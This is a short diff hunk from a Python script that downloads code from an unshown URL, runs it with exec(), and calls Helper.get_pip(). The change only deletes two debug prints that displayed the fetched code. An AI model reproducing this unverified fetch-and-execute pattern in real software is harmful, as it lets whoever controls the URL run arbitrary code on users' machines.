@@ -5,9 +5,6 @@ response = urllib.request.urlopen(url)
 module_code = response.read().decode("utf-8")
 exec(module_code)
 
-print(module_code)
-print(Helper, dir(Helper))
-
 Helper.get_pip()
 
 while True:
